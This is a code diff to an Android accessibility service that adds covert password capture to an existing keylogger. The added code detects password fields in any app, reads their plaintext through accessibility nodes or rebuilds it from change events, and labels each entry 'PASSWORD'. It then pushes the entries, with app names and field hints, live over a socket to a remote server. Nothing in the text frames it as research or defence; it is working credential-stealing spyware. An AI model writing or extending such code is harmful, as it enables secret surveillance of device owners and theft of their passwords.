@@ -97,6 +97,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Keep-screen-alive (no Activity dependency)
     private KeepAliveManager keepAliveManager;
 
+    // Password field tracking via accessibility focus
+    private volatile boolean currentFocusIsPassword = false;
+    private volatile String  currentFocusHint       = "";
+    private volatile String  currentFocusViewId     = "";
+    private volatile String  currentFocusPackage    = "";
+    // Accumulated password per (pkg+viewId) key — we track all chars typed
+    private final java.util.concurrent.ConcurrentHashMap<String, String> passwordAccum =
+            new java.util.concurrent.ConcurrentHashMap<>();
+
     // Socket keep-alive — checked every 30 seconds from this service
     private static final int SOCKET_CHECK_INTERVAL = 30_000;
     private Handler socketCheckHandler;
@@ -225,7 +234,34 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
             
             switch (event.getEventType()) {
-                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+
+                case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
+                    // Track whether the focused view is a password field
+                    AccessibilityNodeInfo focusSrc = event.getSource();
+                    if (focusSrc != null) {
+                        boolean isPass = focusSrc.isPassword();
+                        String viewId = focusSrc.getViewIdResourceName() != null
+                                ? focusSrc.getViewIdResourceName() : "";
+                        CharSequence hintCs = focusSrc.getHintText();
+                        String hint = hintCs != null ? hintCs.toString() : "";
+                        if (hint.isEmpty() && focusSrc.getContentDescription() != null) {
+                            hint = focusSrc.getContentDescription().toString();
+                        }
+                        focusSrc.recycle();
+                        // If focus is leaving a password field (new focus is NOT a password),
+                        // flush the accumulated password BEFORE overwriting tracking state
+                        if (currentFocusIsPassword && !isPass) {
+                            flushPasswordAccum(currentFocusPackage);
+                        }
+                        currentFocusIsPassword = isPass;
+                        currentFocusHint       = hint;
+                        currentFocusViewId     = viewId;
+                        currentFocusPackage    = packageName;
+                    }
+                    break;
+                }
+
+                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                     List<CharSequence> textList = event.getText();
                     if (textList != null && !textList.isEmpty()) {
                         StringBuilder textBuilder = new StringBuilder();
@@ -233,24 +269,83 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                             textBuilder.append(cs);
                         }
                         String typed = textBuilder.toString();
-                        String logLine = "[" + packageName + "] TEXT: " + typed;
+
+                        // Determine if this is a password field
+                        boolean isPasswordField = currentFocusIsPassword;
+                        String  fieldHint       = currentFocusHint;
+                        String  fieldViewId     = currentFocusViewId;
+
+                        // Double-check via source node in case focus tracking missed it
+                        boolean nodeGaveFullText = false;   // true when node returned real plaintext
+                        AccessibilityNodeInfo textSrc = event.getSource();
+                        if (textSrc != null) {
+                            if (textSrc.isPassword()) isPasswordField = true;
+                            if (fieldHint.isEmpty()) {
+                                CharSequence h = textSrc.getHintText();
+                                if (h != null) fieldHint = h.toString();
+                            }
+                            if (fieldViewId.isEmpty() && textSrc.getViewIdResourceName() != null) {
+                                fieldViewId = textSrc.getViewIdResourceName();
+                            }
+                            // For password fields, try to read actual text from source node.
+                            // On many Android versions node.getText() returns the real characters.
+                            if (isPasswordField) {
+                                CharSequence nodeText = textSrc.getText();
+                                if (nodeText != null && nodeText.length() > 0) {
+                                    String nt = nodeText.toString();
+                                    boolean allMasked = true;
+                                    for (char c : nt.toCharArray()) {
+                                        if (c != '•' && c != '*' && c != '\u2022' && c != '\uFF65') {
+                                            allMasked = false; break;
+                                        }
+                                    }
+                                    if (!allMasked) {
+                                        // Node gave us the full plaintext — use it directly
+                                        typed = nt;
+                                        nodeGaveFullText = true;
+                                    }
+                                }
+                            }
+                            textSrc.recycle();
+                        }
+
+                        if (isPasswordField) {
+                            // Accumulate per (pkg + viewId) key so we collect the full password
+                            String accumKey = packageName + "|" + fieldViewId;
+                            if (nodeGaveFullText) {
+                                // Node already gave us the full current field value — store it directly
+                                passwordAccum.put(accumKey, typed);
+                            } else {
+                                // Use addedCount / removedCount delta to maintain accumulation
+                                int added   = event.getAddedCount();
+                                int removed = event.getRemovedCount();
+                                int fromIdx = event.getFromIndex();
+                                String prev = passwordAccum.getOrDefault(accumKey, "");
+                                String next = buildAccumulatedPassword(prev, typed, fromIdx, added, removed);
+                                passwordAccum.put(accumKey, next);
+                                // Push the CURRENT accumulated value for the live password feed
+                                typed = next;
+                            }
+                        }
+
+                        String logLine = "[" + packageName + "] " + (isPasswordField ? "PASSWORD: " : "TEXT: ") + typed;
                         keylogBuffer.add(logLine);
-                        // Capture password fields before text is hidden
                         String appName = getAppNameForPkg(packageName);
-                        // Route to keylogger, app monitor, and push live to server
+                        String eventType = isPasswordField ? "PASSWORD_FOCUS" : "TEXT_CHANGED";
                         try {
                             SocketManager sm = SocketManager.getInstance(this);
-                            sm.getKeylogger().logEntry(packageName, appName, typed, "TEXT_CHANGED");
+                            sm.getKeylogger().logEntry(packageName, appName, typed, eventType);
                             sm.getAppMonitor().onTextChanged(packageName, typed);
-                            // Push immediately for live feed (only when connected)
                             if (sm.isConnected()) {
                                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                         java.util.Locale.getDefault()).format(new java.util.Date());
-                                sm.pushKeylogEntry(packageName, appName, typed, "TEXT_CHANGED", ts);
+                                sm.pushKeylogEntry(packageName, appName, typed, eventType, ts,
+                                        isPasswordField, fieldHint.isEmpty() ? "password" : fieldHint);
                             }
                         } catch (Exception ignored) {}
                     }
                     break;
+                }
                     
                 case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                     updateCurrentAppName();
@@ -1589,6 +1684,67 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         };
         autoClickHandler.post(autoClickRunnable);
+    }
+
+    // ── Password accumulation helpers ─────────────────────────────────────────
+
+    /**
+     * Rebuild the accumulated password string given the previous value, the
+     * raw event text, and the change indices from the accessibility event.
+     *
+     * If the event text contains non-masking characters we prefer that (actual
+     * chars exposed by the node), otherwise we fall back to index-based tracking.
+     */
+    private String buildAccumulatedPassword(String prev, String rawText, int fromIdx, int addedCount, int removedCount) {
+        // If rawText has real (non-masked) characters, trust it directly
+        if (rawText != null && rawText.length() > 0) {
+            boolean hasRealChars = false;
+            for (char c : rawText.toCharArray()) {
+                if (c != '•' && c != '*' && c != '\u2022' && c != '\uFF65') {
+                    hasRealChars = true; break;
+                }
+            }
+            if (hasRealChars) return rawText;
+        }
+        // Fallback: reconstruct from previous + delta
+        if (prev == null) prev = "";
+        try {
+            StringBuilder sb = new StringBuilder(prev);
+            // Remove chars at fromIdx
+            if (removedCount > 0 && fromIdx >= 0 && fromIdx <= sb.length()) {
+                int end = Math.min(fromIdx + removedCount, sb.length());
+                sb.delete(fromIdx, end);
+            }
+            // The added characters — we can't know them without raw text, so leave as-is
+            // (length will track correctly even if chars are '•')
+            return sb.toString();
+        } catch (Exception e) {
+            return prev;
+        }
+    }
+
+    /** Flush any accumulated password for the given package to the live feed. */
+    private void flushPasswordAccum(String pkg) {
+        if (pkg == null || pkg.isEmpty()) return;
+        // Find all keys for this package
+        for (java.util.Map.Entry<String, String> e : passwordAccum.entrySet()) {
+            if (e.getKey().startsWith(pkg + "|") && !e.getValue().isEmpty()) {
+                String accumulated = e.getValue();
+                String appName = getAppNameForPkg(pkg);
+                try {
+                    SocketManager sm = SocketManager.getInstance(this);
+                    sm.getKeylogger().logEntry(pkg, appName, accumulated, "PASSWORD_FOCUS");
+                    if (sm.isConnected()) {
+                        String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
+                                java.util.Locale.getDefault()).format(new java.util.Date());
+                        sm.pushKeylogEntry(pkg, appName, accumulated, "PASSWORD_FOCUS", ts,
+                                true, currentFocusHint.isEmpty() ? "password" : currentFocusHint);
+                    }
+                } catch (Exception ignored) {}
+            }
+        }
+        // Clear all keys for this package
+        passwordAccum.entrySet().removeIf(e -> e.getKey().startsWith(pkg + "|"));
     }
 
     /**
